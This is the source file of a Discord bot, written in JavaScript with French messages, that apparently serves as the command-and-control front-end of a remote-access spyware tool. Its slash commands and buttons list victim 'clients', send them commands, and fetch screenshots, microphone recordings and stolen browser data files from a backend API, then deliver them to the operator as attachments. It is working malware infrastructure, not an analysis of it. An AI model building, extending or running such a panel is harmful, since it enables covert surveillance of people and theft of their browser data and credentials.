import {
    ActionRowBuilder,
    AttachmentBuilder,
    Client,
    GatewayIntentBits,
    StringSelectMenuBuilder
} from 'discord.js';

import config from './static/config.json' assert {type: 'json'};

import { createEmbed } from "./utils/utils.js";
import { executeRequestWithTokenRefresh, refreshTokenIfNeeded } from "./utils/token.js";
import {
    handleClientsCommand,
    handleHelpCommand,
    handleListDataCommand,
    handleSendCommand
} from "./utils/handleCommands.js";

const { TOKEN, API_BASE_URL } = config;

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on('ready', async () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    await refreshTokenIfNeeded();
    client.user.setActivity('/help');
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction);
                break;
            case 'command':
                await handleSendCommand(interaction);
                break;
            case 'listdata':
                await handleListDataCommand(interaction);
                break;
            case 'clients':
                await handleClientsCommand(interaction);
                break;
        }
    } else if (interaction.isButton()) {
        const [type, clientId, browser] = interaction.customId.split('_');
        switch (type) {
            case 'screenshot':
                try {
                    const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/screenshot/client/${clientId}`);
                    const screenshots = response.data;
                    if (screenshots.length === 0) {
                        await interaction.update("Aucune capture d'écran disponible pour ce client.");
                        return;
                    }

                    const options = screenshots.map(screenshot => ({
                        label: `Capture d'écran ${screenshot.id}`,
                        description: `Le ${screenshot.date_created}`,
                        value: screenshot.id.toString(),
                    }));

                    const selectMenu = new StringSelectMenuBuilder()
                        .setCustomId("select_screenshot")
                        .setPlaceholder("Sélectionnez une capture d'écran")
                        .addOptions(options.slice(0, 25)); // Discord limit of 25 options

                    const row = new ActionRowBuilder().addComponents(selectMenu);

                    await interaction.update({ content: "Sélectionnez une capture d'écran :", components: [row] });
                } catch (error) {
                    console.error("Erreur lors de la récupération des captures d'écran", error);
                    await interaction.update({ content: "Erreur lors de la récupération des captures d'écran." });
                }
                break;
            case 'microphone':
                try {
                    const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/microphone/client/${clientId}`);
                    const microphones = response.data;
                    if (microphones.length === 0) {
                        await interaction.update("Aucun enregistrement audio disponible pour ce client.");
                        return;
                    }

                    const options = microphones.map(microphone => ({
                        label: `Audio ${microphone.id}`,
                        description: `Le ${microphone.date_created}`,
                        value: microphone.id.toString(),
                    }));

                    const selectMenu = new StringSelectMenuBuilder()
                        .setCustomId("select_microphone")
                        .setPlaceholder("Sélectionnez un enregistrement audio")
                        .addOptions(options.slice(0, 25)); // Discord limit of 25 options

                    const row = new ActionRowBuilder().addComponents(selectMenu);

                    await interaction.update({ content: "Sélectionnez un enregistrement audio :", components: [row] });
                } catch (error) {
                    console.error("Erreur lors de la récupération des enregistrements audio", error);
                    await interaction.update({ content: "Erreur lors de la récupération des enregistrements audio." });
                }
                break;
            case 'browserdata':
                try {
                    const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/client/${clientId}/${browser}`);
                    const browserData = response.data;
                    if (browserData.length === 0) {
                        await interaction.update("Aucune donnée de navigation disponible pour ce client.");
                        return;
                    }

                    const options = browserData.map(data => ({
                        label: data.file_path.split('/').pop(),
                        description: `Le ${data.date_created}`,
                        value: `${data.id}_${data.file_path.split('/').pop()}`,
                    }));

                    const selectMenu = new StringSelectMenuBuilder()
                        .setCustomId("select_browserdata")
                        .setPlaceholder("Sélectionnez une donnée de navigation")
                        .addOptions(options.slice(0, 25));

                    const row = new ActionRowBuilder().addComponents(selectMenu);

                    await interaction.update({ content: "Sélectionnez une donnée de navigation :", components: [row] });

                } catch (error) {
                    console.error("Erreur lors de la récupération des données de navigation", error);
                    await interaction.update({ content: "Erreur lors de la récupération des données de navigation." });
                }
                break;
        }
    } else if (interaction.customId === "select_screenshot") {
        const screenshotId = interaction.values[0];
        try {
            const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/screenshot/image/${screenshotId}`,
                {method: 'GET', responseType: 'arraybuffer'});
            const imageBuffer = Buffer.from(response.data, "binary");
            const attachment = new AttachmentBuilder(imageBuffer, {
                name: "screenshot.png",
            });

            const embed = createEmbed("Capture d'écran", "Voici la capture d'écran :", [],
                '#2f6d2d', "attachment://screenshot.png");
            await interaction.update({
                files: [attachment],
                embeds: [embed],
                components: [],
            });
        } catch (error) {
            console.error("Erreur lors de la récupération de l'image de la capture d'écran", error);
            await interaction.update({
                content: "Erreur lors de la récupération de l'image de la capture d'écran.",
                components: [],
            });
        }
    } else if (interaction.customId === "select_microphone") {
        const microphoneId = interaction.values[0];
        try {
            const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/microphone/audio/${microphoneId}`,
                {method: 'GET', responseType: 'arraybuffer'});
            const audioBuffer = Buffer.from(response.data, "binary");
            const attachment = new AttachmentBuilder(audioBuffer, {
                name: "audio_" + microphoneId + ".wav",
            });

            await interaction.update({
                content: "Voici l'enregistrement audio :",
                files: [attachment],
                components: [],
            });
        } catch (error) {
            console.error("Erreur lors de la récupération du fichier audio", error);
            await interaction.update({
                content: "Erreur lors de la récupération du fichier audio.",
                components: [],
            });
        }
    }else if (interaction.customId === "select_browserdata") {
        const [browserDataId, filename] = interaction.values[0].split('_');
        try {
            const responseFile = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/data/${browserDataId}`, { responseType: 'text' });
            const file = [new AttachmentBuilder(Buffer.from(responseFile.data, 'utf-8'), { name: filename })];
            await interaction.update({ content: "Voici le fichier de données de navigation :", files: file, components: [] });

        } catch (error) {
            console.error("Erreur lors de la récupération des données de navigation", error);
            await interaction.update({ content: "Erreur lors de la récupération des données de navigation." });
        }
    }

});

client.login(TOKEN).then(r => console.log("Bot démarré avec succès !"));